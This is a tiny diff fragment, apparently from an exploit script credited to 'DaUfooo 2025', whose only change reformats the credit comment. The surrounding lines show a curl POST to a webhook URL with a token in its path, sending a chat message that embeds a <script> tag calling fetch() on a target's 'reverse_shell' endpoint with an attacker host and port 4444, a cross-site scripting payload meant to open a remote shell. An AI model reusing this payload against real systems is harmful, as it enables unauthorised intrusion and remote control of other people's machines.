@@ -9,4 +9,4 @@ curl -X POST "http://10.0.1.10/hooks/YhhM5pSETkxH5yChf/4PW68bZhXbojY5sreznALpWL8
 -H "Content-Type: application/json" \
 --data '{"text": "🚀 <script>fetch(\'http://TARGET:3000/reverse_shell?host=10.0.1.10&port=4444\');</script>"}'
 
-//By DaUfooo 2025
+// By DaUfooo 2025
